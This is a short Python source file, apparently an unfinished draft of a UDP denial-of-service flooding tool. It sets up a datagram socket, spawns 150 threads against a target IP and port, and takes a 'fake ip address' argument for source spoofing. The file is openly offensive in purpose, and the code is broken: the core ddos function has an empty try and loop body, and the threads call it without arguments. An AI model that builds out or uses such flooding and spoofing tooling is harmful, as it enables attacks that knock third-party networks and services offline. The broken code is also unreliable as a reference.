import sys
import os
import random
import platform
import argparse
import threading
import socket

R = '\033[31m'
G = '\033[32m'
C = '\033[36m'
W = '\033[0m'

# v1: just create ddos script

# Instead of using SOCK_STREAM for TCP connections
# using SOCK_DGRAM for UDP connections to keep packets small
# If iterating on this, will use SOCK_STREAM to send bigger packets if I actually understand
# what that means for the network being scanned


sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)


def ddos(target, port, ipaddress):
    try:
      while True:



for i in range(150):
    thread = threading.Thread(target=ddos)
    thread.start()


def main():
    parser = argparse.ArgumentParser(description="DDoS Proof of concept")
    parser.add_argument('-t', '--target', help="Attack target IP address")
    parser.add_argument('-p', '--port', help="Port to attack")
    parser.add_argument('-i', '--ipaddress', help="Fake ip address")

    args = parser.parse_args()

    ddos(args.target, args.port, args.ipaddress)


if __name__ == "__main__":
    main()
